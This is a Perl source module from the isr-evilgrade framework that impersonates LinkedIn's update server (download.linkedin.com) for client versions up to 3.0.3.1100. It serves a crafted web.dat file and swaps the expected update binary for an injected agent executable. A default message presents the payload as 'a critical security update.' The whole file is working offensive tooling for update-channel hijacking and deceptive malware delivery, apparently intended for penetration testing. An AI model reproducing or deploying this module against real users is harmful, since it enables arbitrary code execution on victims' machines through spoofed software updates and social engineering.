###############
# linkedin.pm
#
# Copyright 2010 Francisco Amato
#
# This file is part of isr-evilgrade, www.faradaysec.com .
#
# isr-evilgrade is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation version 2 of the License.
#
# isr-evilgrade is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with isr-evilgrade; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
#
# '''
##
package modules::linkedin;

use strict;
use Data::Dump qw(dump);

use isrcore::utils;

my $base = {
    'name'        => 'linkedin',
    'version'     => '1.0',
    'appver'      => '<= 3.0.3.1100',
    'author'      => ['Francisco Amato < famato +[AT]+ faradaysec.com>'],
    'description' => qq{},
    'vh'          => 'download.linkedin.com',
    'request'     => [
        {   'req'    => '/web.dat',    #regex friendly
            'type'   => 'file',        #file|string|agent|install
            'method' => '',            #any
            'bin'    => 0,
            'string' => "",
            'parse'  => '1',
            'file' => './include/linkedin/linkedin_web.dat',
        },
        {   'req'    => '.bin',        #regex friendly
            'type'   => 'agent',       #file|string|agent|install
            'method' => '',            #any
            'bin'    => 1,
            'string' => '',
            'parse'  => '0',
            'file'   => ''
        },
    ],

    #Options
    'options' => {
        'agent' =>
            { 'val' => './agent/agent.exe', 'desc' => 'Agent to inject' },
        'enable' => {
            'val'  => 1,
            'desc' => 'Status'
        },
        'msg' => {
            'val' => 'This is a critical security update.',
            'desc' =>
                'Update information, You can use some tag <PRODUCT_NAME>,<NEW_PRODUCT_VERSION>,<BR>-'
        },
        'rand1' => {
            'val'    => 'isrcore::utils::RndAlpha(isrcore::utils::RndNum(1))',
            'hidden' => 1,
            'dynamic' => 1,
        },
        'rand2' => {
            'val'    => 'isrcore::utils::RndAlpha(isrcore::utils::RndNum(1))',
            'hidden' => 1,
            'dynamic' => 1,
        },

    }
};

##########################################################################
# FUNCTION      new
# RECEIVES
# RETURNS
# EXPECTS
# DOES          class's constructor
sub new {
    my $class = shift;
    my $self = { 'Base' => $base, @_ };
    return bless $self, $class;
}
1;
